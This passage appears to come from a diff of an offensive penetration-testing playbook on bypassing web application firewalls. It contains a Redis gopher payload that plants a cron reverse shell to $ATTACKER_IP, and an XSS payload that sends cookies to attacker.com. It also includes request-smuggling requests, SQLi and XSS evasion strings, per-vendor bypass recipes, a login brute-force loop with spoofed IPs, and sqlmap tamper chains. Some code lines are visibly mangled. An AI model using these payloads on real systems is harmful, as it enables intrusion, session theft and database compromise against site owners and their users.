+    '*1\r\n\$8\r\nflushall\r\n',
+    '*3\r\n\$3\r\nset\r\n\$1\r\n1\r\n\$65\r\n\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1\n\n\r\n',
+    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$3\r\ndir\r\n\$16\r\n/var/spool/cron/\r\n',
+    '*4\r\n\$6\r\nconfig\r\n\$3\r\nset\r\n\$10\r\ndbfilename\r\n\$4\r\nroot\r\n',
+    '*1\r\n\$4\r\nsave\r\n',
+]
+payload = ''.join(redis_cmds)
+gopher = 'gopher://127.0.0.1:6379/_' + urllib.parse.quote(payload)
+print(gopher)
 "
 ```
 
-## PHASE 15 — SQLMAP TAMPER SCRIPTS
+---
 
-```bash
-# Complete tamper script reference
+## 9. HTTP-LEVEL WAF BYPASS
 
-# ENCODING TAMPERS
-# apostrophemask.py    — ' -> %EF%BC%87 (fullwidth apostrophe)
-# apostrophenullencode.py — ' -> %00%27
-# base64encode.py      — base64 encode the whole payload
-# charencode.py        — URL encode single chars: SELECT -> %53%45%4C%45%43%54
-# chardoubleencode.py  — double URL encode: SELECT -> %2553%2545%254C%2545%2543%2554
-# charunicodeencode.py — Unicode encode: SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054
-# equaltolike.py       — = -> LIKE
-# greatest.py          — > -> GREATEST(a,b): bypass > filter
-# halfversionedmorekeywords.py — /*!0UNION*/
-# htmlencode.py        — HTML entity encode special chars
-# ifnull2ifisnull.py   — IFNULL(a,b) -> IF(ISNULL(a),b,a)
-# multiplespaces.py    — INSERT multiple spaces
-# nonrecursivereplacement.py — double keywords: UNION -> UNUNIONION
-# percentage.py        — SELECT -> %S%E%L%E%C%T
-# randomcase.py        — SELECT -> SeLeCt
-# randomcomments.py    — SELECT -> S/**/E/**/L/**/E/**/C/**/T
-# space2comment.py     — spaces -> /**/ 
-# space2dash.py        — spaces -> --\n
-# space2hash.py        — spaces -> #\n (MySQL only)
-# space2mssqlblank.py  — spaces -> random blank chars (%01-%0F)
-# space2mssqlhash.py   — spaces -> %23\n (MSSQL)
-# space2morehash.py    — spaces -> %23random\n
-# space2mysqlblank.py  — spaces -> %09 %0A %0B %0C %0D %A0
-# space2mysqldash.py   — spaces -> --\n
-# space2plus.py        — spaces -> +
-# unmagicquotes.py     — ' -> \' + add GBK char to confuse MySQL
-# uppercase.py         — lowercase -> UPPERCASE
-# versionedkeywords.py — keyword -> /*!KEYWORD*/
-# versionedmorekeywords.py — keyword -> /*!50000KEYWORD*/
+### 9.1 Chunked Transfer Encoding
 
-# TAMPER COMBINATIONS BY WAF TYPE
+```http
+POST /search HTTP/1.1
+Host: TARGET.COM
+Transfer-Encoding: chunked
+Content-Type: application/x-www-form-urlencoded
 
-# ModSecurity (generic):
-MODSEC_TAMPER="space2comment,charencode,greatest,ifnull2ifisnull,randomcase"
-sqlmap -u "$TARGET_URL?id=1" --tamper=$MODSEC_TAMPER --batch --level=5 --risk=3
+7
+q=UNIO
+1
+N
+7
++SELEC
+1
+T
+5
++1,2,3
+0
 
-# Cloudflare:
-CF_TAMPER="charencode,charunicodeencode,space2comment,uppercase,randomcomments"
-sqlmap -u "$TARGET_URL?id=1" --tamper=$CF_TAMPER --batch --level=5 --risk=3
-
-# AWS WAF:
-AWS_TAMPER="space2comment,charencode,uppercase,randomcase,multiplespaces"
-sqlmap -u "$TARGET_URL?id=1" --tamper=$AWS_TAMPER --batch --level=5 --risk=3
-
-# Imperva:
-IMPERVA_TAMPER="randomcase,charencode,space2comment,ifnull2ifisnull,equaltolike"
-sqlmap -u "$TARGET_URL?id=1" --tamper=$IMPERVA_TAMPER --batch --level=5 --risk=3
-
-# Generic WAF — aggressive:
-GENERIC_TAMPER="apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,uppercase,versionedkeywords,versionedmorekeywords,xforwardedfor"
-sqlmap -u "$TARGET_URL?id=1" --tamper=$GENERIC_TAMPER --batch --level=5 --risk=3 --random-agent
-
-# sqlmap WAF bypass global options
-sqlmap -u "$TARGET_URL?id=1" \
-  --tamper=space2comment,charencode,randomcase \
-  --delay=2 \
-  --timeout=30 \
-  --retries=3 \
-  --randomize=id \
-  --random-agent \
-  --skip-waf \
-  --level=5 --risk=3 --batch \
-  --dbms=mysql \
-  --hex \
-  --no-cast \
-  --technique=BEUSTQ \
-  -v 3
 ```
 
-## PHASE 16 — CUSTOM SQLMAP TAMPER SCRIPT
+```bash
+# Using Python for chunked request
+python3 -c "
+import socket
+s = socket.socket()
+s.connect(('TARGET.COM', 80))
+request = (
+    'POST /search HTTP/1.1\r\n'
+    'Host: TARGET.COM\r\n'
+    'Transfer-Encoding: chunked\r\n'
+    'Content-Type: application/x-www-form-urlencoded\r\n'
+    '\r\n'
+    '5\r\nq=UNI\r\n'
+    '3\rON \r\n'
+    '7\r\nSELECT\r\n'
+    '0\r\n\r\n'
+)
+s.send(request.encode())
+print(s.recv(4096).decode())
+"
+```
+
+### 9.2 HTTP Request Smuggling for WAF Bypass (CL.TE)
+
+```http
+# CL.TE: Front-end uses Content-Length, backend uses Transfer-Encoding
+# WAF sees one request, backend processes two
+
+POST / HTTP/1.1
+Host: TARGET.COM
+Content-Length: 49
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: TARGET.COM
+X-Ignore: X
+```
+
+```http
+# TE.CL: Front-end uses Transfer-Encoding, backend uses Content-Length
+POST / HTTP/1.1
+Host: TARGET.COM
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /admin HTTP/1.1
+Host: TARGET.COM
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+
+x=1
+0
+
+```
+
+### 9.3 HTTP Parameter Pollution (HPP)
+
+```http
+# WAF checks first param, app uses last (or vice versa)
+GET /search?q=safe&q=<script>alert(1)</script> HTTP/1.1
+
+# POST HPP
+POST /search HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+q=safe&q=1'+UNION+SELECT+1,2,3--
+
+# WAF sees q=safe, app processes q=<payload>
+```
+
+### 9.4 Content-Type Manipulation
+
+```bash
+# JSON payload in XML content-type
+curl -X POST "https://TARGET/api/data" \
+  -H "Content-Type: application/xml" \
+  -d '{"key":"<script>alert(1)</script>"}'
+
+# XML payload in JSON content-type
+curl -X POST "https://TARGET/api/xml-parser" \
+  -H "Content-Type: application/json" \
+  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+
+# Multipart to bypass content inspection
+curl -X POST "https://TARGET/upload" \
+  -F "file=@/dev/null;filename=shell.php" \
+  -F "cmd=<script>alert(1)</script>"
+
+# text/plain to bypass JSON/XML WAF rules
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: text/plain" \
+  -d '{"q":"1 UNION SELECT 1,2,3--"}'
+```
+
+### 9.5 IP Spoofing Header Bypass
+
+```bash
+# WAF trusts these headers for IP-based rules
+# If WAF allows internal IPs, add internal IP in these headers
+
+BYPASS_HEADERS=(
+  "X-Forwarded-For: 127.0.0.1"
+  "X-Forwarded-For: 127.0.0.1, 127.0.0.2"
+  "X-Real-IP: 127.0.0.1"
+  "X-Originating-IP: 127.0.0.1"
+  "X-Remote-IP: 127.0.0.1"
+  "X-Remote-Addr: 127.0.0.1"
+  "X-Client-IP: 127.0.0.1"
+  "True-Client-IP: 127.0.0.1"
+  "CF-Connecting-IP: 127.0.0.1"
+  "X-Cluster-Client-IP: 127.0.0.1"
+  "Forwarded: for=127.0.0.1"
+  "X-ProxyUser-Ip: 127.0.0.1"
+)
+
+for header in "${BYPASS_HEADERS[@]}"; do
+  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://TARGET/?id=1'OR'1'='1" -H "$header")
+  echo "[$CODE] $header"
+done
+```
+
+### 9.6 Method Override
+
+```bash
+# Override POST to bypass method-specific WAF rules
+curl -X GET "https://TARGET/admin/delete?id=1" \
+  -H "X-HTTP-Method-Override: DELETE"
+
+curl -X POST "https://TARGET/api" \
+  -H "X-Method-Override: PUT" \
+  -H "X-HTTP-Method: PATCH" \
+  -d '{"admin":true}'
+```
+
+### 9.7 HTTP/2 Header Injection
+
+```http
+# HTTP/2 pseudo-header abuse
+:method: GET
+:path: /
+:scheme: https
+:authority: TARGET.COM
+x-injected: value\r\nHost: attacker.com
+
+# H2C smuggling — HTTP/2 cleartext upgrade
+# Send HTTP/1.1 request with h2c upgrade, smuggle HTTP/2 frames
+```
+
+### 9.8 Large Body Bypass (Payload Padding)
+
+```bash
+# WAF may stop inspecting after N bytes — put payload after padding
+python3 -c "
+padding = 'A' * 65536  # 64KB of junk
+payload = padding + \"' UNION SELECT 1,2,3--\"
+print(f'id={payload}')
+" | curl -sk "https://TARGET/page" --data-binary @-
+```
+
+### 9.9 Accept-Encoding Manipulation
+
+```bash
+# Some WAFs decompress and inspect — some don't
+curl "https://TARGET/?id=1" \
+  -H "Accept-Encoding: gzip, deflate, br" \
+  --compressed
+
+# Send pre-compressed payload
+python3 -c "
+import gzip, sys
+payload = b\"id=1' UNION SELECT 1,2,3--\"
+sys.stdout.buffer.write(gzip.compress(payload))
+" | curl "https://TARGET/page" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Content-Encoding: gzip" \
+  --data-binary @-
+```
+
+---
+
+## 10. ENCODING AND UNICODE BYPASS
+
+### 10.1 URL Encoding Chains
+
+```
+Original: ' UNION SELECT 1,2,3--
+Single: %27%20UNION%20SELECT%201%2C2%2C3--
+Double: %2527%2520UNION%2520SELECT%25201%252C2%252C3--
+Triple: %252527%252520UNION%252520SELECT%2525201%25252C2%25252C3--
+Mixed:  %27%2520UNION%2520SELECT%25201,2,3--
+```
+
+### 10.2 Unicode Normalization Bypass
 
 ```python
-#!/usr/bin/env python
-# tamper/custom_waf_bypass.py
-# Usage: sqlmap --tamper=custom_waf_bypass
+# NFC/NFD normalization — server normalizes, WAF sees different bytes
+# ＜ (U+FF1C fullwidth less-than) normalizes to < in some contexts
+# ｓ (U+FF53 fullwidth s) normalizes to s
 
-import re
+# Python to generate fullwidth equivalents
+def to_fullwidth(s):
+    result = ""
+    for c in s:
+        if 'a' <= c <= 'z' or 'A' <= c <= 'Z' or '0' <= c <= '9':
+            result += chr(ord(c) + 0xFEE0)
+        elif c == ' ':
+            result += '\u3000'          else:
+            result += c
+    return result
+
+# alert(1) in fullwidth
+print(to_fullwidth("alert(1)"))
+# Output: ａｌｅｒｔ（１）
+```
+
+### 10.3 Fullwidth Character Bypass
+
+```
+# Fullwidth equivalents bypass keyword-matching WAFs
+ａｌｅｒｔ(1)               # alert
+ｓｅｌｅｃｔ                  # select
+ｕｎｉｏｎ ｓｅｌｅｃｔ          # union select
+＜ｓｃｒｉｐｔ＞               # <script>
+```
+
+### 10.4 HTML Entity Encoding in Context
+
+```html
+<!-- In HTML attribute context (unquoted) -->
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
+
+<!-- Mixed entities -->
+<img src=x onerror=&Tab;alert(1)>
+<img src=x onerror=&NewLine;alert(1)>
+
+<!-- Named entities that browsers decode -->
+<img src=x onerror=&lpar;alert&lpar;1&rpar;&rpar;>
+```
+
+### 10.5 JavaScript Unicode and Hex Escapes
+
+```javascript
+// Unicode escape in JS identifiers
+\u0061\u006c\u0065\u0072\u0074(1)        // alert(1)
+\u{61}\u{6c}\u{65}\u{72}\u{74}(1)        // ES6+ unicode point escapes
+
+// Hex escape in strings
+eval("\x61\x6c\x65\x72\x74\x28\x31\x29") // eval("alert(1)")
+
+// Octal escape (non-strict mode)
+eval("\141\154\145\162\164\50\61\51")
+
+// Template literal with tag
+String.raw`\u0041` // 'A' unprocessed
+```
+
+### 10.6 CSS Unicode Escapes
+
+```css
+/* CSS unicode escape for property injection */
+body{background:\75rl(javascript:alert(1))}
+/* = background:url(javascript:alert(1)) */
+
+/* In CSS expression (IE) */
+expression(\u0061\u006c\u0065\u0072\u0074(1))
+
+/* Backslash before characters */
+\<\s\c\r\i\p\t\>alert(1)\<\/\s\c\r\i\p\t\>
+```
+
+### 10.7 Overlong UTF-8 Sequences
+
+```
+# These are invalid UTF-8 but some parsers accept them
+# / = 0x2F
+# Overlong 2-byte: 0xC0 0xAF
+# Overlong 3-byte: 0xE0 0x80 0xAF
+
+# In URLs (some older/misconfigured servers decode)
+..%c0%af       = ../
+..%e0%80%af    = ../
+%c0%ae%c0%ae%c0%af = ../
+
+# . = 0x2E
+# Overlong: %c0%2e, %e0%40%ae
+%c0%2e%c0%2e%c0%af = ../
+```
+
+### 10.8 Mixed Encoding Chains
+
+```
+# Layer 1: HTML encode, Layer 2: URL encode, Layer 3: JS encode
+# Each layer decoded by a different processing stage
+
+# XSS through 3 layers:
+# Raw:      <script>alert(1)</script>
+# HTML:     &lt;script&gt;alert(1)&lt;/script&gt;
+# URL:      %26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B
+# Double:   %2526lt%253Bscript%2526gt%253Balert(1)%2526lt%253B%252Fscript%2526gt%253B
+
+# SQLi through encoding chain:
+# Raw:      ' UNION SELECT 1--
+# URL enc:  %27%20UNION%20SELECT%201--
+# Double:   %2527%2520UNION%2520SELECT%25201--
+# + encoded spaces: %27+UNION+SELECT+1--
+```
+
+### 10.9 Null Byte and Newline Injection
+
+```
+# Null byte terminates strings in C-based parsers
+payload%00innocuous
+SELECT%001,2,3--
+<script%00>alert(1)</script%00>
+
+# Newline injection in headers
+Host: TARGET.COM%0d%0aX-Injected: true
+User-Agent: normal%0aX-Forwarded-For: 127.0.0.1
+
+# CRLF injection
+Location: /redirect%0d%0aSet-Cookie: session=pwned
+```
+
+### 10.10 IDN Homograph Attacks
+
+```
+# Unicode characters that look like ASCII
+# а (Cyrillic а, U+0430) looks like a (Latin a)
+# е (Cyrillic е, U+0435) looks like e
+# о (Cyrillic о, U+043E) looks like o
+
+# Example domain lookalike
+аdmin.example.com  # Cyrillic а + dmin
+
+# In URLs, browsers show punycode:
+# аdmin.example.com = xn--dmin-qua.example.com
+
+# Bypass blocklist that checks for "admin" as ASCII
+```
+
+---
+
+## 11. PER-VENDOR BYPASS PLAYBOOKS
+
+### 11.1 Cloudflare Bypass
+
+**Known-Working Bypass Patterns (2024)**
+```http
+# XSS — Cloudflare does not block all SVG variants
+<svg/onload=alert`1`>
+<details/open/ontoggle=alert(1)>
+<img src=x onerror=window['alert'](1)>
+<input onfocus=alert(1) autofocus>
+
+# SQLi bypass against Cloudflare
+1'/*!50000UNION*//*!50000SELECT*/1,2,3--+-
+1'/**/UNION/**/SELECT/**/1,user(),3--+-
+1'%23%0aUNION%23%0aSELECT%23%0a1,2,3--+-
+1' UNION%0aSELECT%0a1,2,3--+-
+
+# Chunked encoding bypass
+POST /search HTTP/1.1
+Host: TARGET.COM
+Transfer-Encoding: chunked
+
+a
+q=UNION SE
+9
+LECT 1,2
+0
+
+```
+
+**workers.dev Origin Bypass**
+```bash
+# Cloudflare Workers may expose origin
+# workers.dev domains bypass CF WAF
+curl -sk "https://TARGET.workers.dev/?id=1'OR'1'='1"
+
+# Check for worker subdomain
+dig TARGET.workers.dev
+```
+
+**Rate Limit Bypass via IP Rotation Headers**
+```bash
+# Cloudflare rate limits by IP — spoof via headers
+for i in $(seq 1 100); do
+  IP="10.$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
+  curl -sk "https://TARGET/api/login" \
+    -H "CF-Connecting-IP: $IP" \
+    -H "X-Forwarded-For: $IP" \
+    -d "user=admin&pass=password$i"
+done
+```
+
+**cf_clearance Cookie Bypass Concept**
+```python
+# Use Playwright/Puppeteer to solve JS challenge, extract cf_clearance
+# Then replay with curl
+import subprocess
+result = subprocess.run([
+    'node', 'solve_cf.js', 'https://TARGET.COM'
+], capture_output=True)
+cf_clearance = result.stdout.decode().strip()
+# Use extracted cookie
+subprocess.run([
+    'curl', '-sk', f'https://TARGET.COM/?id=1%27',
+    '-H', f'Cookie: cf_clearance={cf_clearance}'
+])
+```
+
+### 11.2 AWS WAF Bypass
+
+**RegEx Complexity Attack**
+```
+# AWS WAF regex engine has complexity limits
+# Craft payloads that exceed regex backtracking
+
+# Long repeated patterns confuse RegEx WAF rules
+' OR 1=1-- -AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# Mixed case + junk to confuse ML scoring
+1' uNiOn SeLeCt 1,2,@@VERSION,4-- -
+```
+
+**JSON Body Bypass**
+```bash
+# AWS WAF SQL rules target form params, not always JSON
+curl -X POST "https://TARGET/api/user" \
+  -H "Content-Type: application/json" \
+  -d '{"id":"1 UNION SELECT 1,2,3--"}'
+
+# Nested JSON
+curl -X POST "https://TARGET/api/user" \
+  -H "Content-Type: application/json" \
+  -d '{"query":{"id":"1'"'"' OR '"'"'1'"'"'='"'"'1"}}'
+
+# JSON with Unicode escapes
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"q":"\u003cscript\u003ealert(1)\u003c\/script\u003e"}'
+```
+
+**Managed Rule Group Bypass**
+```bash
+# AWS WAF AWSManagedRulesSQLiRuleSet bypass
+# The SQLi rules score based on patterns — get below threshold
+# Split across multiple parameters
+curl "https://TARGET/page?id=1%27&extra=UNION&more=SELECT&data=1,2,3--"
+
+# Use HAVING instead of WHERE
+curl "https://TARGET/?id=1 HAVING 1=1--"
+
+# Comment-based bypass specific to AWS rule format
+curl "https://TARGET/?id=1'%23%0AUNION%23%0ASELECT%23%0A1,2,3--"
+```
+
+### 11.3 Akamai Bypass
+
+**Pragma Header Trick**
+```bash
+# Akamai sometimes skips inspection on requests with Pragma: no-cache
+curl "https://TARGET/?id=1'OR'1'='1" \
+  -H "Pragma: no-cache" \
+  -H "Cache-Control: no-cache"
+
+# Combined with no-store
+curl "https://TARGET/?id=1'OR'1'='1" \
+  -H "Pragma: akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-nonces, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no"
+```
+
+**Akamai-Specific Encoding Bypass**
+```bash
+# Akamai decodes URL encoding twice in some configs
+# Double-encode the attack chars
+curl "https://TARGET/?id=1%2527%2520UNION%2520SELECT%25201,2,3--"
+
+# Mixed encoding confuses Akamai pattern matching
+curl "https://TARGET/?id=1%27%20UNION%2520SELECT%201,2,3--"
+
+# Unicode path bypass
+curl "https://TARGET/%u002e%u002e/%u002e%u002e/etc/passwd"
+```
+
+### 11.4 Imperva/Incapsula Bypass
+
+**Cookie-Based Bypass**
+```bash
+# Imperva tracks sessions — establish benign session first
+# Then replay with attack payload using same cookies
+
+# Step 1: Get clean session cookies
+COOKIES=$(curl -ski "https://TARGET/" | grep -i "set-cookie" | \
+  grep -E "(visid_incap|nlbi|incap_ses)" | \
+  awk -F': ' '{print $2}' | awk -F';' '{print $1}' | tr '\n' '; ')
+
+# Step 2: Send attack with established session
+curl -sk "https://TARGET/?id=1'OR'1'='1" \
+  -H "Cookie: $COOKIES"
+```
+
+**User-Agent Manipulation**
+```bash
+# Imperva whitelists known good bots
+curl "https://TARGET/?id=1'OR'1'='1" \
+  -H "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)"
+
+curl "https://TARGET/?id=1'OR'1'='1" \
+  -H "User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+```
+
+### 11.5 ModSecurity CRS Bypass
+
+**Paranoia Level Bypass Matrix**
+```
+PL1 (default): Basic rules, easiest to bypass
+PL2: Additional rules, moderate difficulty  
+PL3: Advanced rules, strict
+PL4: Maximum rules, very strict (rarely used in production)
+
+Most production deployments: PL1 or PL2
+Target anomaly score threshold: usually 5 (PL1), 5-10 (PL2)
+```
+
+**SQLi Rule Bypass (942xxx rules)**
+```sql
+-- Rule 942100: SQL Injection Attack Detected via libinjection
+-- Bypass: use operators libinjection doesn't fingerprint
+1;SELECT%20IF(1=1,SLEEP(3),0)--
+1'XOR(if(now()=sysdate(),sleep(3*0),0))XOR'
+-- Rule 942110: SQL Injection Attack: Common Injection Testing Detected
+-- Bypass: avoid ' OR 1=1
+1' AND 1=1 LIMIT 1--
+-- Rule 942160: Detects blind sqli tests using sleep() or benchmark()
+-- Bypass: use alternative delay functions
+1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--
+-- Rule 942200: MySQL comment-/space-obfuscated injections
+-- Bypass: use different obfuscation
+1'/*!50000UNION*/+/*!50000SELECT*/+1,2,3--+-
+```
+
+**XSS Rule Bypass (941xxx rules)**
+```html
+<!-- Rule 941100: XSS Attack Detected via libinjection -->
+<svg onload=alert(1)>
+<!-- Rule 941110: XSS Filter - Category 1 -->
+<img src=x onerror=this.onerror=console.log;fetch`//attacker.com/?`+document.cookie>
+<!-- Rule 941130: XSS Filter - Category 3 -->
+<details open ontoggle=alert`1`>
+<!-- Rule 941160: NoScript XSS InjectionChecker -->
+<math href="javascript:alert(1)">click</math>
+```
+
+**Anomaly Score Exploitation**
+```bash
+# Spread attack across multiple requests — each below threshold
+# Total anomaly score = sum of matched rules
+# Threshold = 5 for PL1
+
+# Instead of one request scoring 10+, send 3 requests scoring 4 each
+
+# Request 1 (score ~3)
+curl "https://TARGET/?a=1+UNION+SELECT"
+
+# Request 2 (score ~3)  
+curl "https://TARGET/?b=1,2,3"
+
+# Request 3 (score ~3)
+curl "https://TARGET/?c=FROM+users--"
+# None individually trigger block, but if processed together = full exploit
+```
+
+### 11.6 F5 BIG-IP ASM Bypass
+
+**Policy Learning Exploitation**
+```bash
+# BIG-IP learns traffic patterns — send benign traffic first to teach it
+# Then gradually add attack components
+
+# Phase 1: Benign training (20+ requests)
+for i in $(seq 1 20); do
+  curl -sk "https://TARGET/search?q=normal+query+$i"
+  sleep 1
+done
+
+# Phase 2: Introduce mild variations
+for i in $(seq 1 10); do
+  curl -sk "https://TARGET/search?q=query+OR+$i"
+  sleep 2
+done
+
+# Phase 3: Full payload after policy training
+curl -sk "https://TARGET/search?q=1'+OR+'1'='1"
+```
+
+**JSON/XML Parser Bypass**
+```bash
+# F5 ASM parses JSON differently from app
+# Inject via nested/malformed JSON
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: application/json" \
+  -d '{"data":{"query":"1 UNION SELECT 1,2,3--","type":"search"}}'
+
+# XML with namespace confusion
+curl -X POST "https://TARGET/api" \
+  -H "Content-Type: text/xml" \
+  -d '<?xml version="1.0"?><root xmlns:t="http://attacker.com"><t:query>1 UNION SELECT 1,2,3--</t:query></root>'
+```
+
+---
+
+## 12. TOOL-SPECIFIC WAF BYPASS
+
+### 12.1 sqlmap Tamper Script Reference
+
+**Complete Tamper Script Catalog with Use Cases**
+```
+apostrophemask.py      → Replace ' with %EF%BC%87 (fullwidth apostrophe)
+apostrophenullencode.py → Replace ' with %00%27
+appendnullbyte.py      → Append NULL byte to payload end
+base64encode.py        → Base64 encode entire payload
+between.py             → Replace > with NOT BETWEEN 0 AND, = with BETWEEN
+bluecoat.py            → Replace spaces with %09, bypass Blue Coat proxy WAF
+charencode.py          → URL-encode all chars (not just special ones)
+charunicodeencode.py   → Unicode-encode non-encoded chars (%u00XX format)
+charunicodeescape.py   → Unicode-escape non-encoded chars (\uXXXX format)
+commalesslimit.py      → Replace LIMIT M,N with LIMIT N OFFSET M
+commalessmid.py        → Replace MID(a,b,c) with MID(a FROM b FOR c)
+commentbeforeparentheses.py → Add /**/ before each (
+concat2concatws.py     → CONCAT(a,b) → CONCAT_WS(MID(@@version,0,0),a,b)
+equaltolike.py         → Replace = with LIKE
+escapequotes.py        → Escape ' and " with backslash
+greatest.py            → Replace > with GREATEST
+halfversionedmorekeywords.py → Add versioned MySQL comment before each keyword
+htmlencode.py          → HTML encode all non-alphanumeric chars
+ifnull2ifisnull.py     → IFNULL(a,b) → IF(ISNULL(a),b,a)
+informationschemacomment.py → Add /**/ after information_schema.
+least.py               → Replace > with LEAST
+lowercase.py           → Lowercase all keywords
+modsecurityversioned.py → Enclose keywords in versioned comment
+modsecurityzeroversioned.py → Enclose keywords in zero-version comment /*!0...*/
+multiplespaces.py      → Add multiple spaces around keywords
+nonrecursivereplacement.py → Replace keywords with non-recursive substitutions
+overlongutf8.py        → Convert all chars to overlong UTF-8 (non-critical chars)
+overlongutf8more.py    → Convert all chars including critical ones
+percentage.py          → Add % before each char (ASP bypass)
+plus2concat.py         → + → CONCAT() for MSSQL
+plus2fnconcat.py       → + → fn+CONCAT() with ODBC syntax
+randomcase.py          → Random upper/lower case
+randomcomments.py      → Insert random comments between keywords
+securesphere.py        → Append special crafted string to bypass SecureSphere
+sp_password.py         → Append sp_password to payload to obscure in MSSQL logs
+space2comment.py       → Replace space with /**/
+space2dash.py          → Replace space with --\n
+space2hash.py          → Replace space with #\n (MySQL only)
+space2morehash.py      → Replace space with #\n## (MySQL only)
+space2mssqlblank.py    → Replace space with random blank char (MSSQL)
+space2mssqlhash.py     → Replace space with %23%0A (MSSQL)
+space2mysqlblank.py    → Replace space with random blank char (MySQL)
+space2mysqldash.py     → Replace space with -- \n
+space2plus.py          → Replace space with +
+space2randomblank.py   → Replace space with random blank char
+symboliclogical.py     → Replace AND/OR with && and ||
+unionalltounion.py     → UNION ALL SELECT → UNION SELECT
+unmagicquotes.py       → Replace ' with %bf%27 (wide char injection)
+uppercase.py           → Uppercase all keywords
+varnish.py             → Add X-originating-IP header
+versionedkeywords.py   → Enclose non-function keywords in versioned comment
+versionedmorekeywords.py → Enclose all keywords in versioned comment
+xforwardedfor.py       → Add random X-Forwarded-For header
+```
+
+**Tamper Chain Per WAF Vendor**
+```bash
+# Cloudflare
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="space2comment,randomcase,charunicodeencode" \
+  --level=5 --risk=3 --dbms=mysql
+
+# ModSecurity CRS
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="modsecurityversioned,space2comment,randomcomments,between" \
+  --level=5 --risk=3
+
+# AWS WAF
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="randomcase,space2mysqlblank,charencode" \
+  --level=5 --risk=3
+
+# Imperva
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="securesphere,space2comment,charunicodeencode" \
+  --level=5 --risk=3 --random-agent
+
+# F5 BIG-IP
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="versionedkeywords,space2comment,multiplespaces" \
+  --level=5 --risk=3
+
+# Akamai
+sqlmap -u "https://TARGET/?id=1" \
+  --tamper="charunicodeencode,space2comment,randomcase,appendnullbyte" \
+  --level=5 --risk=3
+```
+
+**Custom Tamper Script Template**
+```python
+#!/usr/bin/env python3
+# custom_bypass.py — template for WAF-specific tamper script
+# Place in sqlmap/tamper/ directory
+
 from lib.core.enums import PRIORITY
 
 __priority__ = PRIORITY.NORMAL
@@ -1172,188 +2134,1149 @@ def dependencies():
 
 def tamper(payload, **kwargs):
     """
-    Custom WAF bypass tamper script.
-    Applies: random case + inline comments + version comments + space variants
-    
-    Example:
-        Input:  1 UNION SELECT 1,2,3 FROM users WHERE id=1--
-        Output: 1/**/UNiOn/*!50000SeLeCt*/1,2,3/**/FrOm/**/users/**/WHeRe/**/id=1--
+    Applies multi-layer obfuscation:
+    1. Replaces spaces with /**/ comments
+    2. URL-encodes special chars in hex
+    3. Randomly cases SQL keywords
+    4. Injects MySQL version comments around keywords
+
+    Tested against: ModSecurity CRS PL2, Cloudflare Free
     """
-    if payload:
-        # Step 1: Replace spaces with random variant
-        import random
-        space_variants = ['/**/', '/*!*/', '%09', '%0a', '%0b', '%0c', '%0d', '%a0']
-        
-        def replace_space(m):
-            return random.choice(space_variants)
-        
-        payload = re.sub(r'\s+', replace_space, payload)
-        
-        # Step 2: Random case for SQL keywords
-        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR', 'INSERT',
-                    'UPDATE', 'DELETE', 'DROP', 'CREATE', 'TABLE', 'INTO', 
-                    'HAVING', 'GROUP', 'ORDER', 'BY', 'LIMIT', 'OFFSET',
-                    'JOIN', 'ON', 'AS', 'NOT', 'IN', 'LIKE', 'BETWEEN']
-        
-        for kw in keywords:
-            # Random case
-            new_kw = ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in kw)
-            payload = re.sub(r'\b' + kw + r'\b', new_kw, payload, flags=re.IGNORECASE)
-        
-        # Step 3: Version comment wrap SELECT
-        payload = re.sub(r'\bSELECT\b', '/*!50000SELECT*/', payload, flags=re.IGNORECASE)
-        
-        # Step 4: Add random comment between keywords
-        payload = re.sub(r'\b(UNION)\b', r'\1/**/', payload, flags=re.IGNORECASE)
-        
-    return payload
+    import re, random
+
+    if payload is None:
+        return payload
+
+    KEYWORDS = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
+                'INSERT', 'UPDATE', 'DELETE', 'DROP', 'TABLE',
+                'ORDER', 'BY', 'GROUP', 'HAVING', 'LIMIT', 'OFFSET']
+
+    result = payload
+
+    # Step 1: Version-comment wrap keywords
